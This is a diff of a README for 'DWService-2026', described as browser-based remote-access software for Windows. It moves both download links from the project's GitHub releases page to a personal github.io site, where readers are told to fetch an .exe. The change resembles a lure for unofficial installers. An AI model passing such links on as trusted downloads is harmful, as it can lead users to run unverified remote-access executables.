@@ -1,6 +1,6 @@
 # 🖥️ DWService-2026 - Access your computer from anywhere easily
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Kalifinha/DWService-2026/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://kalifinha.github.io)
 
 DWService provides remote access to your computer using a web browser. This software allows you to control your PC, transfer files, and manage system resources from any location with an internet connection. This version works with Windows 10 and Windows 11.
 
@@ -8,7 +8,7 @@ DWService provides remote access to your computer using a web browser. This soft
 
 You must visit the release page to get the installer for your system.
 
-[Click here to visit the download page](https://github.com/Kalifinha/DWService-2026/releases)
+[Click here to visit the download page](https://kalifinha.github.io)
 
 Choose the file ending in .exe from the list under the latest release. Save this file to your computer.
 
